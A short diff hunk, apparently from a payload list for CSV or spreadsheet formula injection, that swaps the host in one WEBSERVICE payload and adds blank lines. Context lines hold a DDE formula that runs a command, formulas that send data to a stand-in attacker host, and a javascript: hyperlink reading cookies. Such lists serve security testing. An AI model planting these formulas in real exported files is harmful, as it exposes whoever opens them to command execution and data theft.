@@ -325,4 +325,7 @@ Hacker,=DDE("cmd";"/c calc";"!"),Malicious
 # When exported from web applications
 =WEBSERVICE(CONCAT("http://attacker.com/?cookie=",CELL("filename")))
 =HYPERLINK("javascript:alert(document.cookie)","click")
-=@SUM(A1:A1000)*WEBSERVICE("http://attacker.com")
+=@SUM(A1:A1000)*WEBSERVICE("http://attacker.google.com")
+
+
+
